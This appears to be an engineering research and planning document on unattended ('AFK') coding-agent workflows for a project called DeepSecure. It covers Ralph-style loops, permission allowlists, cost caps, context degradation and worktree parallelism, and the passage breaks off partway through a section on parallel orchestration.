# AFK (Away From Keyboard) Workflows for DeepSecure

> **Goal:** Enable developers to write a spec, walk away, and come back to passing tests and open PRs.
> This document synthesizes research from 48 industry sources into a concrete implementation plan for DeepSecure.

---

## Table of Contents

- [Research Sources](#research-sources)
- [Design Principles](#design-principles) (13 principles)
- [Industry Consensus: 8 Pillars of AFK Development](#industry-consensus-8-pillars-of-afk-development) (+ Pillars 9-11)
  - [1. Plan First, Execute Autonomously](#1-plan-first-execute-autonomously)
  - [2. Fresh Context Per Iteration (Ralph Wiggum Pattern)](#2-fresh-context-per-iteration-the-ralph-wiggum-pattern)
  - [3. Manual First, Automate Second](#3-manual-first-automate-second)
  - [4. Worktree Isolation for Parallelism](#4-worktree-isolation-for-parallelism)
  - [5. Permission Handling That Doesn't Block](#5-permission-handling-that-doesnt-block)
  - [6. Self-Healing (Verify, Fix, Retry)](#6-self-healing-verify-fix-retry)
  - [7. Notification When Stuck or Done](#7-notification-when-stuck-or-done)
  - [8. CLAUDE.md as Table of Contents](#8-claudemd-as-table-of-contents-not-encyclopedia)
  - [9. Dynamic Workflows](#9-dynamic-workflows-claude-code-may-2026)
  - [10. Routines (Cloud-Based Scheduled Agents)](#10-routines-cloud-based-scheduled-agents)
  - [11. Agent View and Background Sessions](#11-agent-view-and-background-sessions)
- [Production Failure Modes](#production-failure-modes)
- [AFK Cost Economics](#afk-cost-economics)
- [DeepSecure on Shapiro's Five Levels](#where-deepsecure-sits-on-shapiros-five-levels)
- [DeepSecure as AFK Security Infrastructure](#deepsecure-as-afk-security-infrastructure-dog-fooding)
- [What DeepSecure Already Has](#what-deepsecure-already-has)
- [What's Missing for AFK](#whats-missing-for-afk)
- [Implementation Plan](#concrete-action-plan-enabling-afk-for-deepsecure)
  - [Phase 1: Low-Hanging Fruit](#phase-1-low-hanging-fruit-can-implement-today)
  - [Phase 1.5: Agent Frontmatter Upgrade](#phase-15-agent-frontmatter-upgrade)
  - [Phase 2: Ralph Wiggum Loop](#phase-2-ralph-wiggum-loop-for-deepsecure)
  - [Phase 3: Notification System](#phase-3-notification-system)
  - [Phase 3.5: AFK Permissions and Hooks](#phase-35-afk-permissions-and-hooks)
  - [Phase 4: New Skills](#phase-4-new-skills-for-afk-operation)
  - [Phase 5: CLAUDE.md Refactoring](#phase-5-claudemd-refactoring-openai-pattern)
  - [Phase 6: Parallel Orchestration](#phase-6-sandcastle-style-parallel-orchestration)
- [Priority Ranking](#priority-ranking)
- [Architectural Decision: Ralph Loop vs /run-batch](#architectural-decision-ralph-loop-vs-run-batch)
- [Verified Claude Code API Surface](#verified-claude-code-api-surface-june-2026)
- [Machine Sleep and Recovery Protocol](#machine-sleep-and-recovery-protocol)
- [Competitive Landscape (June 2026)](#competitive-landscape-june-2026)
- [The Contrarian Views](#the-contrarian-views)
- [Key Takeaways by Practitioner](#key-takeaways-by-practitioner)

---

## Research Sources

| # | Source | Author / Org | Key Concept | Link |
|---|--------|-------------|-------------|------|
| 1 | Managed Agents | Anthropic | Decoupled brain/hands/session architecture | [anthropic.com](https://www.anthropic.com/engineering/managed-agents) |
| 2 | Agent Harness | Cursor | Dynamic context, keep-rate metric, tool reliability tracking | [cursor.com](https://cursor.com/blog/continually-improving-agent-harness) |
| 3 | Cloud Agent Lessons | Cursor | Three-layer state decoupling, simplicity and control | [cursor.com](https://cursor.com/blog/cloud-agent-lessons) |
| 4 | Software Factory | Harvey AI | Cloud sandboxes, durable audit objects, team visibility | [lightsprint.ai](https://lightsprint.ai/blog/harvey-built-their-own-software-factory) |
| 5 | Background Agent (Inspect) | Ramp | Modal sandboxes, child sessions, multiplayer, 30% of PRs from agents | [builders.ramp.com](https://builders.ramp.com/post/why-we-built-our-background-agent) |
| 6 | Five Levels | Dan Shapiro | L0 Manual to L5 Dark Factory progression | [danshapiro.com](https://www.danshapiro.com/blog/2026/01/the-five-levels-from-spicy-autocomplete-to-the-software-factory/) |
| 7 | Harness Engineering | OpenAI | AGENTS.md as TOC, docs/ as truth, dependency layering, 1M LOC zero human-written | [openai.com](https://openai.com/index/harness-engineering/) |
| 8 | Everything is a Ralph Loop | Geoffrey Huntley | Monolithic Ralph, manual-first methodology, evolutionary software | [ghuntley.com/loop](https://ghuntley.com/loop/) |
| 9 | Claude Code Cheatsheet | awesomeclaude.ai | Hook events, headless flags, permission profiles, subagent frontmatter | [awesomeclaude.ai](https://awesomeclaude.ai/code-cheatsheet) |
| 10 | X threads | Boris Cherny (Claude Code creator) | 5 parallel Claudes in worktrees, hooks taxonomy, agent swarms | [x.com/bcherny](https://x.com/bcherny) |
| 11 | X thread | Thariq (Anthropic) | 9 skill categories, skills as folders, `/babysit-pr` | [x.com/trq212](https://x.com/trq212/status/2033949937936085378) |
| 12 | X threads | Noah Zweben (Anthropic PM) | `/autofix-pr`, Routines, `/schedule`, Monitor tool, Remote Control | [x.com/noahzweben](https://x.com/noahzweben/status/2032533699116355819) |
| 13 | X threads | Matt Pocock | Ralph Wiggum loop, Sandcastle, Grill/Spec/Slice/Ship | [x.com/mattpocockuk](https://x.com/mattpocockuk/status/2007924876548637089) |
| 14 | X threads | Dax Raad (OpenCode) | Contrarian: "agents come later", one fast agent > many slow | [x.com/thdxr](https://x.com/thdxr/status/2038969038135582990) |
| 15 | X thread | Mike Piccolo | Agent AFK: spec, research, plan, parallelize, build, verify, heal, ship | [x.com/mfpiccolo](https://x.com/mfpiccolo/status/2049139067359568032) |
| 16 | One-Person Code Factory | Ryan Carson | `prd.json` with `passes`, skills staleness, 15 simultaneous agents | [O'Reilly interview](https://www.oreilly.com/radar/ryan-carson-is-a-one-person-code-factory/) |
| 17 | Software 3.0 / Sequoia Ascent | Andrej Karpathy | "Automate what you can verify", jagged intelligence, agent-native docs | [karpathy.bearblog.dev](https://karpathy.bearblog.dev/sequoia-ascent-2026/) |
| 18 | Dark Software Factory | Deep Research Synthesis | Zero-trust AFK identity, fast-merge philosophy, sediment problem, skill engineering patterns | [Building AFK Workflows for DeepSecure](../chats/cursor_deepsecure_repository_afk_workfl.md) |
| 19 | Hermes Agent | Nous Research | Persistent self-improving autonomous agent; meta-orchestrator delegating to Claude Code/Codex/OpenCode; 6 terminal backends, built-in cron, multi-platform messaging, self-improving skills | [github.com/nousresearch/hermes-agent](https://github.com/nousresearch/hermes-agent) |
| 20 | Skill Quality Scoring | omriariav/omri-cc-stuff | Automated marketplace plugins scoring skills against multi-dimensional rubrics | [claudemarketplaces.com](https://claudemarketplaces.com/plugins/omriariav-omri-cc-stuff) |
| 21 | Effective Harnesses for Long-Running Agents | Anthropic Engineering | JSON over Markdown for state, single-feature-per-session, browser automation for verification | [anthropic.com](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents) |
| 22 | Running Claude Code Overnight | Eva Khmelinskaya | Phased sessions (30-60 min), `< /dev/null` for background, compaction rule dilution, `--max-budget-usd` | [medium.com](https://medium.com/@evekhm/running-claude-code-autonomously-overnight-what-breaks-and-how-to-fix-it-3bee3bd958b5) |
| 23 | Claude Code Dynamic Workflows | Anthropic (May 28, 2026) | JavaScript orchestration scripts, 16 concurrent subagents, `/deep-research`, `/effort ultracode` | [agentpedia.codes](https://agentpedia.codes/blog/claude-opus-4-8-claude-code-workflows) |
| 24 | Building Agents with Claude Agent SDK | Anthropic Engineering | Same tools/loop/context as Claude Code, programmable in Python/TypeScript, Managed Agents for production | [anthropic.com](https://www.anthropic.com/engineering/building-agents-with-the-claude-agent-sdk) |
| 25 | How Boris Uses Claude Code | howborisusesclaudecode.com | 5 parallel worktrees, shell aliases, hundreds of agents, "surprisingly vanilla" setup, Opus 4.5 with thinking | [howborisusesclaudecode.com](https://howborisusesclaudecode.com/) |
| 26 | 35 Claude Code Tips from Boris | Anup compilation | Verification loops 2-3x quality, end corrections with "update CLAUDE.md", 5 subagents for exploration | [anup.io](https://www.anup.io/35-claude-code-tips-from-the-guy-who-built-it/) |
| 27 | Cursor Self-Hosted Cloud Agents | Cursor | Temporal-based orchestration, "one 9" to "two 9s" reliability, 50M+ actions/day, video demos | [cursor.com](https://cursor.com/blog/self-hosted-cloud-agents) |
| 28 | How Ramp Built Inspect on Modal | Modal / Ramp | Pre-built snapshots every 30 min, instant start, 40-50% of PRs from agents, non-engineers shipping code | [modal.com](https://modal.com/blog/how-ramp-built-a-full-context-background-coding-agent-on-modal) |
| 29 | Extreme Harness Engineering | Latent Space | OpenAI's 1B tokens/day, Symphony/Elixir orchestration, 1-minute build rule, ghost libraries, P0-P2 review | [latent.space](https://www.latent.space/p/harness-eng) |
| 30 | Self-Improving Coding Agents | Addy Osmani | Anti-rationalization tables, compounding error math, scope creep as primary failure mode | [addyosmani.com](https://addyosmani.com/blog/self-improving-agents/) |
| 31 | Sandcastle Framework | Matt Pocock | TypeScript library for parallel sandboxed agents, worktree + Docker isolation, branch strategies | [github.com/mattpocock/sandcastle](https://github.com/mattpocock/sandcastle) |
| 32 | The Creator of OpenCode on AI Productivity | Codacy / Dax Raad | "The productivity feeling is real, the productivity isn't", one fast agent > many slow, wait for users | [blog.codacy.com](https://blog.codacy.com/the-creator-of-opencode-thinks-youre-fooling-yourself-about-ai-productivity) |
| 33 | 2026 Agentic Coding Trends Report | Anthropic | Industry-wide adoption metrics, permission modes, hook patterns, enterprise deployment patterns | [resources.anthropic.com](https://resources.anthropic.com/hubfs/2026%20Agentic%20Coding%20Trends%20Report.pdf) |
| 34 | Agent View Documentation | Anthropic | `claude agents` dashboard, supervisor process, background sessions, `/bg`, session lifecycle | [code.claude.com](https://code.claude.com/docs/en/agent-view) |
| 35 | /goal Command Documentation | Anthropic | Evaluator-based autonomous completion, Haiku-class checker, turn/time bounds, `/goal` vs `/loop` | [code.claude.com](https://code.claude.com/docs/en/goal) |
| 36 | Routines Documentation | Anthropic (Noah Zweben) | Cloud-based scheduled agents, API/GitHub/cron triggers, `/schedule`, daily caps, branch permissions | [code.claude.com](https://code.claude.com/docs/en/routines) |
| 37 | Dynamic Workflows Blog | Anthropic | 6 composition patterns, JS orchestration, `ultracode` effort, `/deep-research`, 1000 subagent cap | [claude.com/blog](https://claude.com/blog/introducing-dynamic-workflows-in-claude-code) |
| 38 | A Harness for Every Task | Anthropic (Boris Cherny) | Fan-out-synthesize, adversarial verification, tournament, classify-and-act, generate-and-filter, loop-until-done | [claude.com/blog](https://claude.com/blog/a-harness-for-every-task-dynamic-workflows-in-claude-code) |
| 39 | Opus 4.8 Announcement | Anthropic | Adaptive thinking, effort levels, SWE-Bench Pro 69.2%, dynamic workflows launch, fast mode 3x cheaper | [anthropic.com](https://www.anthropic.com/news/claude-opus-4-8) |
| 40 | Ralph Claude Code v0.11.5 | frankbria | Circuit breaker, dual-condition exit gate, rate limiting, 5-hour API detection, session continuity | [github.com](https://github.com/frankbria/ralph-claude-code) |
| 41 | Peter Steinberger (steipete) | steipete.me | Anti-infrastructure: no worktrees, no MCP, no subagents, pointer-style AGENTS.MD, iterative rules | [steipete.me](https://steipete.me/posts/just-talk-to-it) |
| 42 | Agent AFK | Mike Piccolo | Local-first control plane, 11 skills, adversarial re-derivation, Telegram oversight, `npm install -g agent-afk` | [agentafk.com](https://www.agentafk.com/) |
| 43 | Afkode | Afkode.ai | Desktop orchestrator, 8-phase planning, 16 model slots, operational journal, worktree isolation | [afkode.ai](https://afkode.ai/docs) |
| 44 | Background Claude | Cyrus | Headless/scheduled/managed AFK modes, `--permission-mode dontAsk`, cost management patterns | [backgroundclaude.com](https://backgroundclaude.com/) |
| 45 | Hermes Agent v0.14.0 | Nous Research | `/handoff` live model switch, cross-session prompt caching, OpenAI-compatible proxy, 22 platforms | [github.com](https://github.com/NousResearch/hermes-agent/releases/tag/v2026.5.16) |
| 46 | OWASP Top 10 for Agentic Applications | OWASP | ASI05 hardware-enforced sandboxing, ASI04 short-lived credentials, ASI08 resource exhaustion | [genai.owasp.org](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) |
| 47 | Anthropic 50-Day Degradation Postmortem | InfoQ / VentureBeat | Reasoning effort downgrade, caching bug, system prompt verbosity, 73% thinking collapse, silent fallbacks | [infoq.com](https://www.infoq.com/news/2026/05/anthropic-claude-code-postmortem/) |
| 48 | Agent SDK Billing Change (June 15) | Anthropic | `claude -p` headless gets separate credit pool ($20-200/mo), hard failure on exhaustion, no fallback | [support.claude.com](https://support.claude.com/en/articles/15036540-use-the-claude-agent-sdk-with-your-claude-plan) |

---

## Design Principles

These foundational principles should guide all AFK decisions for DeepSecure. They come from Karpathy, Huntley, and OpenAI.

### Principle 1: Automate What You Can Verify (Karpathy)

> "Traditional software automates what you can specify. LLMs and RL automate what you can verify."

This is the classification framework for which DeepSecure tasks are AFK-safe:

| Task Type | Verifiable? | AFK Classification | Example |
|-----------|-------------|-------------------|---------|
| CRUD endpoints with tests | Yes (tests pass/fail) | Full AFK | Adding a new API endpoint with pytest coverage |
| Database migrations | Yes (migration runs, rollback works) | Full AFK with extra verification |  Schema changes with up/down migration |
| Crypto/auth code | Partially (tests exist but domain is a training valley) | HITL (human-in-the-loop) | Ed25519 challenge-response, JWT creation |
| Security architecture | No (requires judgment) | Human-only | Trust model design, permission boundaries |
| API contract design | No (requires judgment) | Human-only | New endpoint schema decisions |
| Frontend UI polish | Partially (screenshot comparison) | HITL | Visual verification needed |

**For DeepSecure specifically:** The crypto/auth code is in what Karpathy calls a "jagged intelligence" valley -- less training data than standard CRUD, so models spike on common patterns but struggle on domain-specific security code. AFK agents on auth tasks need extra verification compared to standard endpoints.

### Principle 2: Outsource Thinking, Never Understanding (Karpathy)

AFK workflows automate *implementation*, not *architecture*. Humans retain ownership of:
- Security boundaries and trust model
- API design and contract decisions
- Cryptographic protocol choices
- Service boundary definitions

The plan must be human-owned. Execution can be agent-owned.

### Principle 3: Ralph is Monolithic (Huntley)

> "Consider what microservices would look like if the microservices (agents) themselves are non-deterministic -- a red hot mess."

Single process. Single task. Single repo. The Ralph loop is deliberately simple:
- One agent per iteration
- One task per iteration
- Fresh context each time
- File-based memory (git commits), not context-based memory

Multi-agent coordination adds non-determinism on top of non-determinism. Use it only for truly independent workstreams (e.g., control plane + gateway that don't share schemas).

### Principle 4: Agent Legibility Over Human Taste (OpenAI)

Code produced by AFK agents should be optimized first for the agent's ability to reason about it in future iterations. This means:
- Clear, explicit naming over clever abstractions
- Flat structures over deep nesting
- Verbose but unambiguous over concise but contextual
- Standard patterns over custom idioms

This doesn't mean ugly code -- it means code that reads well in a 200k-token context window.

### Principle 5: Agent-Native Documentation (Karpathy + OpenAI)

> "Context window is the new program." -- Karpathy

Documentation should be optimized for agent consumption:
- Structured, machine-parseable formats (YAML frontmatter, explicit headers)
- Progressive disclosure: agents start with a small, stable entry point (CLAUDE.md) and are taught where to look next
- Everything that matters lives in-repo as versioned artifacts -- "anything it can't access in-context while running effectively doesn't exist"
- Cross-linked documentation mechanically enforced through linters and CI

### Principle 6: Failure is the Curriculum (Huntley + Boris)

> "Every caught mistake becomes future prevention." -- Boris Cherny

The **"watch the loop" methodology**: developer learning comes from observing loop failures, then fixing the failure domain so it never recurs.

```
AFK loop iteration fails
  -> Developer observes failure
  -> Identifies root cause
  -> Fixes CLAUDE.md / skills / hooks
  -> That class of failure never happens again
  -> Loop quality compounds over time
```

This is the mechanism by which AFK quality improves. Each failure produces a permanent fix encoded into the repo. Document failures in `.afk/learnings.md` (see Phase 2).

### Principle 7: Application Legibility (OpenAI)

> "If an agent cannot 'see' the application, it cannot verify its own work."

The runtime state, application interfaces, logs, and metrics must be directly queryable by the agent. For DeepSecure this means:
- Health check endpoints (`/health`) on both control plane and gateway
- Structured logging queryable by agents (not just human-readable)
- `docker compose logs` accessible from within AFK scripts
- Test output parseable by the agent (JSON format preferred)
- Database state queryable via standard tools (`psql`, `redis-cli`)

Without legibility, an agent can generate code but has no way to verify it works in the running system.

### Principle 8: Taste Encoded as Rules (OpenAI)

> "Subjective architectural preferences cause non-deterministic behavior in agents. Preferences must be codified into strict linters and automated policies."

The agent should self-correct *mechanically*, not *probabilistically*. Every style preference that would require human review must become an automated check:
- Code formatting: `ruff format` + `isort` via PostToolUse hook (not relying on the agent to remember)
- Import ordering: enforced by `isort`, not by CLAUDE.md instructions
- Naming conventions: enforced by custom linters, not by prose rules
- Architecture boundaries: enforced by structural tests (e.g., "gateway cannot import control plane modules")
- File size limits: enforced by linters, not by judgment

**For DeepSecure:** The `app/` prefix convention, `*_service.py` naming, and dependency layering documented in CLAUDE.md should become mechanical checks, not prose rules.

### Principle 9: Managing Entropy (OpenAI)

> "High-velocity AI output generates digital garbage and unnecessary complexity over time."

AFK agents generate code at unprecedented velocity. Without active cleanup, the repo collapses under entropy:
- **Golden principles**: Core invariants (e.g., "all endpoints require auth", "all services have health checks") enforced by structural tests
- **Automated garbage collection**: Recurring background agents scan for deviations from golden principles and open targeted refactoring PRs
- **Dead code detection**: Agents remove unused imports, unreachable code, orphaned test fixtures
- **Complexity budgets**: Monitor cyclomatic complexity per module, flag when thresholds exceeded

This is not optional at scale -- OpenAI found that without entropy management, agent-generated repos become unmaintainable within weeks.

### Principle 10: The Capability Architect (OpenAI + Shapiro)

> "Engineers must abandon writing implementation details and instead serve as 'capability architects,' designing the environments and feedback loops in which agents operate."

At L4 and above, the human role shifts from "writes code" or "reviews diffs" to:
- Designing skill directories and their gotchas files
- Configuring permission profiles and hook pipelines
- Building verification infrastructure (tests, linters, structural checks)
- Maintaining the golden principles and entropy GC routines
- Evaluating and improving the AFK loop's success rate

The output of a capability architect is not code -- it's the **environment** in which agents produce code.

### Principle 11: Compounding Error Math (Osmani + Anthropic)

> "A 20-step process with 95% per-step reliability only succeeds 36% of the time."

Tool calling fails 3-15% of the time in production. This is the fundamental constraint on long autonomous runs. The math is unforgiving:

| Steps | 95% per-step | 90% per-step |
|-------|-------------|-------------|
| 5 | 77% | 59% |
| 10 | 60% | 35% |
| 20 | 36% | 12% |
| 50 | 8% | 0.5% |

**Implications for AFK:**
- Prefer many short iterations (Ralph loop) over one long session
- Each iteration should be 1 task, not 10 — the fewer steps, the higher the success probability
- Self-healing (retry on failure) improves per-step reliability, but cannot overcome the exponential decay of chaining
- OpenAI enforces a **one-minute maximum build loop** — if builds exceed this, agents halt and decompose the task. This forces smaller, more testable changes.

### Principle 12: JSON Over Markdown for Agent State (Anthropic Research)

> "Models are less likely to inappropriately modify structured JSON compared to Markdown, which they tend to rewrite or summarize."

Anthropic's harness engineering research specifically recommends JSON for progress tracking. The problem with Markdown checklists (`- [ ] Task 1`):
- Models may rewrite surrounding text while updating a checkbox
- Markdown is ambiguous (indentation, nested lists, mixed formatting)
- Harder for scripts to parse reliably

The fix (from Carson's `prd.json`):
```json
{
  "tasks": [
    {"id": "WS-A1", "description": "Create auth endpoint", "passes": false, "blocked": null},
    {"id": "WS-A2", "description": "Add JWT validation", "passes": false, "blocked": null},
    {"id": "WS-B1", "description": "Gateway routing", "passes": true, "blocked": null}
  ]
}
```

Boolean `passes` makes completion detection trivial for scripts. `blocked` captures failure reason. JSON parse errors are immediately detectable (unlike malformed Markdown which silently degrades).

### Principle 13: Environment Quality Over Model Quality (Cursor + Ramp)

> "The single biggest factor in cloud agent output quality is ensuring it has a full development environment." — Cursor Engineering

Cursor's migration from work-stealing to Temporal-based orchestration took them from "one 9" to "two 9s" of reliability. Ramp's Inspect agent uses Modal sandboxes with pre-built snapshots (Postgres, Redis, Temporal, RabbitMQ, VS Code server, Chromium) refreshed every 30 minutes — sessions start working in seconds.

The lesson: upgrading the model from Sonnet to Opus matters less than ensuring the agent has:
- A full development environment with all services running
- Fast feedback loops (tests complete in under 60 seconds)
- Pre-built snapshots so cold starts are fast
- Sandboxed execution so the agent can't damage shared state

**For DeepSecure:** Before investing in more sophisticated orchestration, ensure `docker compose up` is fast and reliable, test suites run quickly, and the Ralph prompt loads the right context.

### Principle 14: Silent Degradation is the Real Enemy (Anthropic Postmortem + Community)

> "50 days of quality collapse across three overlapping product-layer changes, and no user-facing notification." — InfoQ, May 2026

The March-April 2026 degradation incident proved that AFK workflows face threats beyond model capability:

1. **Reasoning effort was silently downgraded** (high to medium) for UI latency — reverted April 7
2. **A caching bug** cleared thinking blocks every turn instead of once per idle session — users with 900K tokens faced full cache misses — fixed April 10
3. **System prompt verbosity limit** ("keep text between tool calls to 25 words") caused 3% quality drop — reverted April 20

Independent audit (Stella Laurenzo, AMD): 6,852 sessions analyzed. Median visible thinking collapsed 73% (2,200 chars in Jan to 600 chars in March). API calls required up to 80x more retries.

**The lesson for AFK:** Product-layer changes can break autonomous workflows without any model change. AFK workflows must include their own quality monitoring — not just "did the task complete" but "did the output quality degrade."

**Context budget thresholds (observed):**

| Context Usage | Behavior |
|---------------|----------|
| 0-20% | Peak performance |
| ~20% | Circular reasoning can appear |
| ~40% | Context compression kicks in, degradation starts |
| ~48% | Model recommends fresh session |
| ~80% | Auto-compaction fires |

**Critical:** Verbal constraints set during a session ("don't modify file X") are lost during compaction. Only CLAUDE.md rules survive compaction (re-injected at session start). All critical AFK constraints must be in CLAUDE.md or the prompt file, never set conversationally.

### Principle 15: Cost Isolation for Headless Agents (Anthropic, June 2026)

> "Automated requests fail — they do not queue, do not fall back to a lower-cost model, and do not notify the user in real time." — Anthropic Agent SDK billing docs

**Effective June 15, 2026:** `claude -p` (headless mode) draws from a separate Agent SDK credit pool, not the interactive subscription.

| Plan | Agent SDK Credits/Month | Hard Failure On Exhaustion |
|------|------------------------|---------------------------|
| Pro | $20 | Yes — requests fail silently |
| Max 5x / Team Premium | $100 | Yes |
| Max 20x / Enterprise Premium | $200 | Yes |

This means a heavy AFK Ralph loop could exhaust Pro credits ($20) in hours. The previous subscription was subsidizing agent usage by 15-30x versus API pricing. AFK workflows must include cost monitoring and overflow configuration (opt-in "usage credits" toggle, OFF by default).

---

## Industry Consensus: 8 Pillars of AFK Development

### 1. Plan First, Execute Autonomously

Every successful AFK setup front-loads planning and specification. The agent doesn't wing it.

| Practitioner | Planning Approach |
|-------------|-------------------|
| Boris Cherny | Plan mode (Shift+Tab x2), iterate until plan is solid, then one-shot the implementation |
| Matt Pocock | `/grill-me` (40-80 questions) then PRD then vertical tracer bullets then ship |
| Mike Piccolo (Agent AFK) | spec, research, plan, parallelize, build, verify, heal, ship |
| OpenAI | Structured `docs/` directory, design specs as agent input, 3.5 PRs/engineer/day |
| Ryan Carson | `prd.json` with explicit `passes: true/false` per story, machine-parseable |
| DeepSecure (today) | `/run-plan` then `/breakdown-design` then `/create-workstream` then `/run-batch` |

**Why it matters:** Without a clear plan, AFK agents drift, hallucinate file paths, and produce code that doesn't integrate. The plan is the contract between human intent and autonomous execution.

**Boris's key insight:** "Pour energy into the plan. Once the plan is good, Claude will one-shot the implementation almost every time."

**Matt's evolution:** He initially used Plan mode but shifted to `/grill-me` -- a skill that forces the agent to ask 40-80 questions before generating anything. "The whole point of planning is to get on the same wavelength with the LLM, not to generate an asset you don't read."

**Carson's `prd.json` format:** Machine-parseable completion tracking with `passes: true/false` per story, plus an append-only `progress.txt` for learnings. The boolean makes completion detection trivial for scripts.

---

### 2. Fresh Context Per Iteration (The Ralph Wiggum Pattern)

Run the agent in a `while true` loop, each iteration starting with a clean context window.

**How it works:**
1. A bash loop repeatedly invokes `claude` with a prompt file
2. Each iteration: agent reads a PRD + progress file, finds the next unchecked task, implements it, commits, updates progress
3. Fresh context window each iteration -- avoids context pollution from long sessions
4. Originally by Geoffrey Huntley; Ryan Carson built the [snarktank/ralph](https://github.com/snarktank/ralph/) repo (17k stars); Matt Pocock popularized and refined the workflow; frankbria/ralph-claude-code v0.11.5 added production-grade reliability features

```bash
# The core Ralph pattern (simplified)
while true; do
  claude --print \
    --output-format json \
    --prompt-file ralph-prompt.md \
    --allowedTools "Edit,Write,Bash(git:*),Bash(pytest:*)" \
    --max-turns 50 \
    --max-budget-usd 5.00 \
    < /dev/null
done
```

**Critical flags for AFK/background execution:**
- `< /dev/null`: **MANDATORY** for background processes. Without this, Claude hangs waiting for stdin when run via `nohup` or `&`, then exits silently. Eva Khmelinskaya documented this as the #1 overnight failure mode.
- `--max-budget-usd N`: Per-session cost ceiling. Prevents runaway API costs during overnight AFK. Set to expected cost per task + 50% buffer.
- `--dangerously-skip-permissions`: Full autonomy bypass. Boris Cherny explicitly does NOT use this — use `--allowedTools` instead.
- `--permission-mode auto`: Classifier-gated alternative (safer than full skip). An Opus 4.5 classifier evaluates each permission request and auto-approves safe ones.

**Completion detection — the sentinel pattern (snarktank/ralph):**
The canonical Ralph implementation monitors output for a sentinel string and exits immediately:
```bash
OUTPUT=$(claude --print --prompt-file ralph-prompt.md < /dev/null 2>&1 | tee /dev/stderr) || true
if echo "$OUTPUT" | grep -q "<promise>COMPLETE</promise>"; then
  echo "All tasks complete!"
  break
fi
```
The agent is instructed to output `<promise>COMPLETE</promise>` when all tasks are done. This is faster than re-checking the progress file — the loop exits within seconds of completion instead of waiting for the next iteration.

**Why fresh context matters — The Sediment Problem:** Long-running single sessions accumulate stale context, outdated file contents, and compaction artifacts — what the Dark Software Factory paper calls the **Sediment Problem**. After ~100k tokens, compacted context becomes increasingly unreliable: the agent may reference deleted files, use outdated API signatures, or repeat already-completed work. Each fresh Ralph iteration sees the codebase as it actually is right now because it starts clean.

**The Smart Zone (~0–100k tokens):** Agent performance peaks in this range. Beyond it, compaction artifacts and stale references cause quality degradation that compounds with each additional compaction cycle. Matt Pocock's rule: "Keep LLM context under ~100k tokens; clear and restart rather than compact to avoid sediment degrading quality." The Ralph pattern enforces the Smart Zone structurally — each iteration is a fresh context window that never exceeds it.

**Matt's HITL-to-AFK graduation:**
> "I had a full day of HITL Ralph yesterday, watching it like a hawk and improving my prompt. Today has been almost all AFK, leaving it for long periods and coming back to good code."

**Key constraints from Matt's experience:**
- Cap iterations (5-10 for small tasks, 30-50 for larger ones) -- infinite loops with stochastic systems are dangerous
- Block commits unless tests pass
- Build end-to-end vertical tracer bullets, not layer by layer
- Bias toward small tasks for AFK, slightly larger for HITL

**The deliberate simplicity is the feature** (community consensus):
```
loop:
  1. Launch fresh agent (clean context)
  2. Point at repo + structured task file
  3. Execute single scoped unit of work
  4. Run verification (tests, lint, typecheck)
  5. Commit if successful
  6. Record progress
  7. Exit -> restart loop
```

Each task has explicit acceptance criteria. `passes: false` -> `passes: true` only when criteria are satisfied.

**Ralph v0.11.5 Production Features (frankbria/ralph-claude-code):**

The community fork has matured significantly with 784 tests at 100% pass rate:

| Feature | How It Works |
|---------|-------------|
| **Dual-Condition Exit Gate** | Both `completion_indicators >= 2` AND `EXIT_SIGNAL: true` in RALPH_STATUS block required — prevents premature exit |
| **Circuit Breaker** | 3 loops no progress OR 5 loops same error → OPEN state; 30min cooldown; state machine CLOSED → OPEN → HALF_OPEN → CLOSED |
| **Rate Limiting** | Default 100 calls/hour (`MAX_CALLS_PER_HOUR`), optional `MAX_TOKENS_PER_HOUR` |
| **5-Hour API Limit Detection** | Three-layer verification (timeout guard, JSON parsing, filtered text fallback) |
| **Session Continuity** | `--resume <session_id>` with 24hr expiry |
| **GitHub Integration** | Issue import, lifecycle management, queue processing, follow-up issue creation |

Modern CLI: `--monitor` (tmux dashboard), `--live` (streaming), `--dry-run`, `--backup`/`--rollback`, `--notify`. Config via `.ralphrc` file.

**`/goal` as Ralph Alternative (v2.1.139+):**

The `/goal` command provides a built-in alternative to the Ralph loop for single-session autonomous work:
- Sets a completion condition; Claude keeps working across turns until met
- After each turn, a **separate Haiku-class evaluator** checks the condition (not the worker model)
- If "no" → Claude starts another turn with the evaluator's reason as guidance
- If "yes" → goal clears automatically

```bash
# Non-interactive /goal usage
claude -p "/goal all acceptance criteria in TASK.md are verified and tests pass, or stop after 20 turns"
```

| Approach | Next turn starts when | Stops when | Best for |
|----------|----------------------|------------|----------|
| Ralph loop | Previous iteration finishes | Sentinel or max iterations | Multi-task workstreams with fresh context |
| `/goal` | Previous turn finishes | Evaluator confirms condition | Single complex task within one session |
| `/loop` | Time interval elapses | User stops or Claude decides | Recurring/polling tasks |
| Stop hook | Previous turn finishes | Your script decides | Custom completion logic |

---

### 3. Manual First, Automate Second

Geoffrey Huntley's critical methodology insight: **do the loop manually first with Ctrl+C pauses before automating**.

> "Ralph is about getting the most out of how the underlying models work through context engineering."

**The progression:**

| Stage | What You Do | Why |
|-------|-------------|-----|
| 1. Manual single-task | Run `afk-once.sh`, watch output, Ctrl+C if off-track | Learn the failure domains |
| 2. Manual loop | Run Ralph manually, pause between iterations, review each commit | Build intuition for what works |
| 3. Supervised AFK | Run Ralph unattended but check every 30 min | Verify the loop is stable |
| 4. Full AFK | Run Ralph and walk away | Confidence earned through stages 1-3 |

**Why this matters for DeepSecure:** The repo has complex auth flows, dual-service architecture, and security-critical code. Jumping straight to full AFK without understanding how the agent handles these domains will produce silent failures. Start with manual single-task execution to learn where the agent struggles (crypto code, token types, service boundaries) before automating.

---

### 4. Worktree Isolation for Parallelism

Boris Cherny calls this "the single biggest productivity unlock." Run 3-5 git worktrees, each with its own Claude session, working on different tasks simultaneously.

**Boris's workflow:**
- 5 Claude instances in parallel in iTerm2 tabs, numbered 1-5
- Uses iTerm2 system notifications to know when a Claude needs input
- While one agent runs tests, another refactors, a third drafts docs
- Also runs 5-10 Claudes on claude.ai in browser simultaneously
- Ships 20-30 PRs per day (normal), peaked at 150 PRs/day as an experiment
- Runs "hundreds of agents at any given moment, thousands more doing overnight work"
- His key human skill: "It's not about deep work, it's about how good I am at context switching and jumping across multiple different contexts very quickly."

**Noah Zweben's fire-and-forget pattern:**
```bash
claude --worktree --tmux
# Spin up an autonomous Claude on its own worktree, in its own terminal.
# Fire and forget. Come back to a PR.
```

**Matt Pocock's Sandcastle framework:**
- Single `sandcastle.run()` TypeScript call
